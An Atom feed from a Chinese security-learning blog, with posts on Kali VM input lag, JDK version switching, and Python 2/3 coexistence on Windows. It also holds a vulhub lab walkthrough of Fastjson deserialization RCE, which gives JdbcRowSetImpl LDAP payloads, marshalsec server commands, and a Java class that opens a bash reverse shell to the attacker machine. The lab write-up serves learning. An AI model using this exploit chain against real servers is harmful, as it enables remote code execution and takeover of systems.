<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦~醒🥝</title>
  
  
  <link href="https://blog.m3x1.cn/atom.xml" rel="self"/>
  
  <link href="https://blog.m3x1.cn/"/>
  <updated>2025-04-01T14:21:41.340Z</updated>
  <id>https://blog.m3x1.cn/</id>
  
  <author>
    <name>梦~醒🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>kali虚拟机命令框输入卡顿解决方法</title>
    <link href="https://blog.m3x1.cn/posts/76ed990f.html"/>
    <id>https://blog.m3x1.cn/posts/76ed990f.html</id>
    <published>2025-04-01T16:00:00.000Z</published>
    <updated>2025-04-01T14:21:41.340Z</updated>
    
    <content type="html"><![CDATA[<h2 id="选择版本">选择版本</h2><p>“编辑此虚拟机”-&gt;“选项”-&gt;“版本”</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401172803382.png" alt="image-20250401172803382"></p><p>往低版本切换，然后看看哪个版本不卡。</p><p>我是这样做的，希望能帮到你。</p><h2 id="切换usb兼容设置">切换usb兼容设置</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401222011607.png" alt="image-20250401222011607"></p><h2 id="输入抓取选择高">输入抓取选择高</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401222030589.png" alt="image-20250401222030589"></p>]]></content>
    
    
    <summary type="html">🥧kali虚拟机命令框输入卡顿解决方法</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub漏洞靶场】fastjson反序列化漏洞及fastjson反序列化漏洞复现</title>
    <link href="https://blog.m3x1.cn/posts/5e02e69e.html"/>
    <id>https://blog.m3x1.cn/posts/5e02e69e.html</id>
    <published>2025-03-31T16:00:00.000Z</published>
    <updated>2025-04-01T07:17:46.948Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="漏洞原理">漏洞原理</h2><h3 id="啥是json">啥是json?</h3><p>json全称是JavaScript object notation。即JavaScript对象标记法，使用键值对进行信息的存储。举个简单的例子如下：</p><p>{</p><pre><code>    &quot;name&quot;:&quot;BossFrank&quot;,    &quot;age&quot;:23,    &quot;media&quot;:[&quot;CSDN&quot;,&quot;bilibili&quot;,&quot;Github&quot;]</code></pre><p>}</p><p>json本质就是一种字符串，用于信息的存储和交换。</p><h3 id="啥是fastjson">啥是fastjson?</h3><p>fastjson 是一个 有阿里开发的一个开源Java 类库，可以将 Java 对象转换为 JSON 格式(序列化)，当然它也可以将 JSON 字符串转换为 Java 对象（反序列化）。Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象（这就是漏洞来源，下文会解释）。使用比较广泛。</p><h3 id="fastjson序列化-反序列化原理">fastjson序列化/反序列化原理</h3><p>fastjson的漏洞本质还是一个java的反序列化漏洞，由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的setter方法。</p><p>那么为啥要引进Auto Type功能呢？</p><p>fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。其实，对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：</p><p>1.基于setter/getter</p><p>2.基于属性（AutoType）</p><p>基于setter/getter会带来什么问题呢，下面举个例子，假设有如下两个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal price;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">iphone</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal price;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例化对象之后，假设苹果对象的price为0.5，Apple类对象序列化为json格式后为：</p><p>{“Fruit”:{“price”:0.5}}</p><p>假设iphone对象的price为5000,序列化为json格式后为：</p><p>{“Fruit”:{“price”:5000}}</p><p>当一个类只有一个接口的时候，将这个类的对象序列化的时候，就会将子类抹去（apple/iphone）只保留接口的类型(Fruit)，最后导致反序列化时无法得到原始类型。本例中，将两个json再反序列化生成java对象的时候，无法区分原始类是apple还是iphone。</p><p>为了解决上述问题： fastjson引入了基于属性（AutoType），即在序列化的时候，先把原始类型记录下来。使用@type的键记录原始类型，在本例中，引入AutoType后，Apple类对象序列化为json格式后为：</p><p>{ “fruit”:{ “@type”:“com.hollis.lab.fastjson.test.Apple”, “price”:0.5 } }</p><p>引入AutoType后，iphone类对象序列化为json格式后为：</p><p>{ “fruit”:{ “@type”:“com.hollis.lab.fastjson.test.iphone”, “price”:5000 } }</p><p>这样在反序列化的时候就可以区分原始的类了</p><h2 id="fastjson反序列化漏洞原理">fastjson反序列化漏洞原理</h2><p>使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p><p>常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！因此整个漏洞复现的原理过程就是：</p><p>攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。<br>存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？<br>rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）<br>rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。<br>靶机服务器执行了恶意代码，被攻击者成功利用。</p><p>大致理解如下图：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/573507598b3f5d8f994ed6de07fcd013.png" alt="img"></p><h2 id="靶场复现">靶场复现</h2><h3 id="1-2-24-rce">1.2.24-rce</h3><blockquote><p>kali靶机：192.168.192.132</p><p>kali攻击机（java8环境）&amp;服务器：192.168.192.133</p></blockquote><p>靶机启动环境</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331100516446.png" alt="image-20250331100516446"></p><p>访问靶机ip:8090,能访问成功即搭建环境成功。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331100927877.png" alt="image-20250331100927877"></p><h4 id="寻找方式">寻找方式</h4><p>寻找存在 Fastjson 漏洞的方法，就是先找到参数中内容是 json 数据的接口，然后使用构造好的测试 payload 进行提交验证，检测原理跟 sql 注入差不多，首先找到参数提交的地方，然后再用 payload 尝试。</p><p>我们先进行抓包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331101715500.png" alt="image-20250331101715500"></p><p>我们先将GET改成POST，然后看响应包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331125818259.png" alt="image-20250331125818259"></p><p>有”fastjson“的信息，说明存在漏洞。</p><p>此时我们将GET改成POST，添加Conten-Type字段为application/json，添加Content-Lenth字段，长度可以大一点。再添加请求参数，如下图所示：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331101918636.png" alt="image-20250331101918636"></p><p>看响应包，已经改变了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331102033009.png" alt="image-20250331102033009"></p><p>于是提交java对象试试，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#1.2.24:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.192.133:7788/exp&quot;,  #IDAP服务器的ip:端口/文件</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#1.2.27:</span><br><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.192.133:7788/exp&quot;,  #IDAP服务器的ip:端口/文件</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出现500报错</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331103206485.png" alt="image-20250331103206485"></p><h4 id="漏洞利用">漏洞利用</h4><h5 id="”文件服务器-配置">”文件服务器&quot;配置</h5><p>首先在攻击机上准备一个简单的EXP，写Shell配置好反弹地址和端口(改成自己的攻击机的ip和监听端口)</p><p>EXP:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class exp &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp;/dev/tcp/192.168.192.133/6666 0&gt;&amp;1&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac进行编译，编译完成后，有个class文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac C:\Users\Anonymous\Desktop\exp.java</span><br></pre></td></tr></table></figure><h6 id="方法一：">方法一：</h6><p>通过phpstudy开启网站服务，（**如果是打实战的话，需要用到公网服务器做服务端getshell。）**然后将编译后的exp.class文件移动到www目录下。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331105936651.png" alt="image-20250331105936651"></p><h6 id="方法二：">方法二：</h6><p>在.class文件所在目录直接开启终端，然后用python开一个http</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 7766  //端口随意，路径是文件的位置</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331130050031.png" alt="image-20250331130050031"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331130104433.png" alt="image-20250331130104433"></p><h5 id="”RMI-LDAP服务器“设置-我用的LDAP服务">”RMI/LDAP服务器“设置(我用的LDAP服务)</h5><p>接下来需要用到marshalsec，安装方法：</p><blockquote><p>git clone <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a>  #虚拟机下载慢可以直接去项目打包然后拖进去</p><p>cd marshalsec</p><p>mvn clean package -DskipTests #编译</p></blockquote><p>编译成功后/marshalsec/target会出现marshalsec-0.0.3-SNAPSHOT-all.jar的文件，编译时间可能有点久（注意要是java8环境）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401101740455.png" alt="image-20250401101740455"></p><p>接下来在攻击kali利用marshalsec开启LDAP服务</p><p>解释一下这里，上面的环境已经开启了临时的网站环境，环境下面有exp.class，这里开启的7788端口是给LDAP的，然后把这个端口和7766绑定一起，将LDAP服务绑定到7788端口的目的是为了在7788端口上监听LDAP请求并响应，而这个路径下面有java类文件exp.class，通告构造恶意的josn请求去执行java类文件，达到反弹shell的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.192.133:7766/#exp 7788</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401113309210.png" alt="image-20250401113309210"></p><p>同时创建监听6666端口信息，也就是上面编译后的exp.class文件中指向攻击机的端口</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250331103455305.png" alt="image-20250331103455305"></p><h5 id="抓包Getshell">抓包Getshell</h5><p>然后访问vulhub上的fastjson进行抓包，请求包构造恶意josn请求为访问攻击机下的rmi服务，这里的Content-type的类型与上面相同改为  application/josn 发送POST请求。</p><p>请求格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.192.133:7788/exp&quot;, #IDAP服务器的ip:端口/文件</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401113427182.png" alt="image-20250401113427182"></p><p>可以看到返回包很慢或者没有，但是看监听端口发现已经连上了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401113540791.png" alt="image-20250401113540791"></p><p>至此getshell成功。</p><h3 id="1-2-47-rce">1.2.47-rce</h3><p>利用步骤跟1.2.24-rce一样，只是最后抓包改包GetShell时换成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.192.133:7788/exp&quot;,  #IDAP服务器的ip:端口/文件</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401151424631.png" alt="image-20250401151424631"></p>]]></content>
    
    
    <summary type="html">🥧【vulhub漏洞靶场】fastjson反序列化漏洞及fastjson反序列化漏洞复现；fastjson漏洞1.2.24-rce漏洞详情及利用；fastjson漏洞1.2.47-rce漏洞利用</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>kali系统java版本下载配置及不同版本切换</title>
    <link href="https://blog.m3x1.cn/posts/93b636bf.html"/>
    <id>https://blog.m3x1.cn/posts/93b636bf.html</id>
    <published>2025-03-30T16:00:00.000Z</published>
    <updated>2025-04-01T02:03:47.365Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="查看当前-JDK-版本信息">查看当前 JDK 版本信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eade4c6a968f45c6b4ff221c70fbc804.png" alt="img"></p><p>当前只有一个17版本</p><h2 id="安装-JDK版本（以JDK8为例）">安装 JDK版本（以JDK8为例）</h2><p>官网下载jdk8版本的Java：</p><blockquote><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c92b77df880b46e08bd3c899c119518e.png" alt="img"></p><h2 id="将jdk文件移动到-usr-local">将jdk文件移动到/usr/local/</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar  -zxf  jdk-8u212-linux-x64.tar.gz           #解压jdk文件, 这里注意修改你自己的文件名称</span><br><span class="line">mv  jdk1.8.0_212  /usr/local/                       #将解压好的文件移动到local目录</span><br></pre></td></tr></table></figure><h2 id="配置环境变量">配置环境变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure><p>在文件末尾加上以下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=/usr/local/jdk1.8.0_212</span><br><span class="line">PATH=$PATH:$HOME/bin:$JAVA_HOME/bin</span><br><span class="line">export JAVA_HOME</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a2e08b71bc77422abb18893f93f7b0d3.png" alt="img"></p><h2 id="注册安装jdk8">注册安装jdk8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#安装并注册</span><br><span class="line">update-alternatives --install /usr/bin/java java /usr/local/jdk1.8.0_212/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /usr/local/jdk1.8.0_212/bin/javac 1</span><br><span class="line">update-alternatives --set java /usr/local/jdk1.8.0_212/bin/java</span><br><span class="line">update-alternatives --set javac /usr/local/jdk1.8.0_212/bin/javac</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/649caa57c5d14755b86c8c8f1ada0cdf.png" alt="img"></p><p>检查是否成功配置Java环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5b61d5de419c47c8b0e7eb6db1acad75.png" alt="img"></p><h2 id="切换版本">切换版本</h2><p>通过以下操作进行版本切换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f26f11c423d74213b5fffee2407cc172.png" alt="img"></p><blockquote><p>参考：<a href="https://blog.csdn.net/m0_63082628/article/details/140192833">kali配置多版本jdk并自由切换_kali切换jdk版本-CSDN博客</a></p></blockquote>]]></content>
    
    
    <summary type="html">🥧kali系统java版本下载配置及切换；kali配置java8；kali机java不同版本切换</summary>
    
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="其他学习笔记" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>win10系统配置python2和python3共存以及配置pip</title>
    <link href="https://blog.m3x1.cn/posts/6c2a0a85.html"/>
    <id>https://blog.m3x1.cn/posts/6c2a0a85.html</id>
    <published>2025-03-29T16:00:00.000Z</published>
    <updated>2025-03-30T14:56:24.135Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="配置python2和python3">配置python2和python3</h2><p>首先，去Python官网<strong>找到Python2和3版本对应的安装包下载</strong></p><p>下面是python2和3的下载地址 ：<a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210722220714087-1009299070.png" alt="img"></p><p>在E盘下建立两个文件夹，分别为python2和python3，根据自己的情况可以改动，两者在一块并列更方便以后安装和调整环境变量。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724184253195-363962755.png" alt="img"></p><p>接下来，就是<strong>分别对Python2和3的安装包进行安装</strong></p><h3 id="安装Python3">安装Python3</h3><p>在选择路径安装时，记得把下方的“Add Python  3.6  toPATH”勾选上，这样就不用手动配置环境变量了，后续不用再添加环境变量。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210722221118419-867488911.png" alt="img"></p><p>自定义尽量不装c盘</p><p>完事下一步，到如下图位置，全部默认选择即可，安装在上面建立的python3文件夹下。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210722222147052-1345469882.png" alt="img"></p><p>安装成功后，cmd控制台输入python，查看是否成功。出现下面证明安装成功。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724181755309-1235964516.png" alt="img"></p><h3 id="安装Python2">安装Python2</h3><p>all user 是供使用这台电脑的所有用户使用，是权限问题。just for me是说只供当前用户使用。<br>如果你的电脑上只有建了一个用户，all users和just me 的作用是一样的。</p><p>所以上下区别不大，选哪个都行，依实际情况而定。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724183120895-1671717632.png" alt="img"></p><p>这里尽量不要安装在c盘，安装在上面建立的python2文件夹中，之后Next下一步。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724183924937-1869909986.png" alt="img"></p><p>红色框内我们不用管它，这是因为上面安装python3已经自动添加了环境变量，继续安装。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724185403604-1358730756.png" alt="img"></p><p>安装完成</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724185620961-1767052962.png" alt="img"></p><p>此时我们对比一下python2和python3文件夹的内容，会发现都存在python.exe。那么肯定不能是同名的，后续要修改的。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724190440439-184478838.png" alt="img"></p><p><img src="https://img2020.cnblogs.com/blog/2370051/202107/2370051-20210724190614172-854278329.png" alt="img"></p><h3 id="配置环境变量">配置环境变量</h3><p>点击进入环境变量</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724190800717-1450201625.png" alt="img"></p><p>编辑path值，然后点击编辑文本</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724190933370-1105442649.png" alt="img"></p><p>配置系统环境变量，在系统变量中由于没有安装Python的路径条目，所以需要我们手动配置。</p><p>找到安装python的路径和其路径底下的scripts路径，比如：E:\python2\Scripts和E:\python2</p><p>下面两种方法，编辑配置环境变量：</p><p>1.新建一个环境变量，把刚刚复制的python的路径和其路径底下的scripts路径依次创建，新建的环境变量都会在最下面，需要我们上移到最上端。</p><p>2.直接在最开始编辑文本，如下所示。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724193849404-1457801460.png" alt="img"></p><p>环境变量配置完应该是这样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724192805955-1278954775.png" alt="img"></p><p>注意注意！<strong>配置完一定要点这个确定！否则算没有配置成功！</strong></p><p><strong><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194122153-102162505.png" alt="img"></strong></p><p>配置完环境变量之后，进入python2和python3根目录，分别修改python.exe名字为python2.exe和python3.exe，分别修改pythonw.exe名字为pythonw2.exe和pythonw3.exe。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194405858-318836222.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194442607-1292545240.png" alt="img"></p><p>按“Win + R”快捷键，在打开的“运行”对话框中，输入“cmd”按回车，进入如下界面，输入python2查看python2安装情况，显示python 2.7.18 的版本信息，则安装成功</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194626842-1184082555.png" alt="img"></p><p>再按“Win + R”快捷键，在打开的“运行”对话框中，输入“cmd”按回车，进入如下界面，输入python3查看python3安装情况，显示python 3.9.4 的版本信息，则安装成功</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210724194829939-1008215687.png" alt="img"></p><h2 id="pip配置">pip配置</h2><p>Python 安装包需要用到包管理工具pip，但是当同时安装python2和python3的时候，pip只是其中一个版本，以下将提供一个修改方式，即重新安装两个版本的pip，使得两个python版本的pip能够共存。</p><p>在命令提示框输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure><p>下图便是安装成功。</p><p>如果这个指令报错的话，建议换这个试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip -i https://pypi.douban.com/simple（pip源在国外，连起来比较慢，所以导致服务器连接超时）</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210725204111046-883695211.png" alt="img"></p><p>接下来也是在命令提示框输入命令，安装成功即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9be1da665188b1ab462a383362d82077.png" alt="img"></p><p>安装完成之后，可以使用pip2 -V 或者pip3 -V查看对应的pip版本了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6dbc2e2e7acd0e4919cbec38419cd1bf.png" alt="img"></p><h2 id="python2安装-更新pip时出错问题解决">python2安装/更新pip时出错问题解决</h2><h3 id="分析原因">分析原因</h3><p>发现安装出现问题。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210725204441354-2144440410.png" alt="img"></p><p>查阅资料，推测可能是因为pip源在国外，连起来比较慢，所以导致服务器连接超时，解决方法可以改用国内的源。</p><p>输入指令：python2 -m pip install --upgrade pip -i <a href="https://pypi.douban.com/simple%EF%BC%8C%E4%BE%9D%E6%97%A7%E6%8A%A5%E9%94%99%E3%80%82">https://pypi.douban.com/simple，依旧报错。</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2370051-20210725205019506-258609077.png" alt="img"></p><p>继续查阅关于pip安装报错的相关知识，推测可能是由于pip团队在2021年1月发布的<code>pip 21.0版本完全</code>停止了对Python 2.7的支持。</p><p>所以只能卸载python2的pip，然后重新安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip 